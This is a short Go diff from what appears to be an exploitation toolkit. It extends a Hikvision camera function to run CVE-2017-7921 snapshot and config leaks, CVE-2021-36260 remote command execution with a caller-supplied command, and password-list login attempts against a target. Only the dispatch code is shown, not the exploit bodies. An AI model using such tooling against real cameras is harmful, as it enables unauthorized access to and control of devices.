@@ -606,13 +606,17 @@ func (a *App) AlibabaNacos(target, headers string, attackType int, username, pas
 	return target + "不存在该漏洞"
 }
 
-func (a *App) HikvsionProduct(target string, attackType int, proxy clients.Proxy) string {
+func (a *App) HikvsionCamera(target string, attackType int, passwordList []string, cmd string, proxy clients.Proxy) string {
 	switch attackType {
 	case 0:
 		body := hikvision.CVE_2017_7921_Snapshot(target, clients.JudgeClient(proxy))
 		return base64.RawStdEncoding.EncodeToString(body)
 	case 1:
 		return hikvision.CVE_2017_7921_Config(target, clients.JudgeClient(proxy))
+	case 2:
+		return hikvision.CVE_2021_36260(target, cmd, clients.JudgeClient(proxy))
+	case 3:
+		return hikvision.CheckLogin(target, passwordList)
 	}
 	return ""
 }
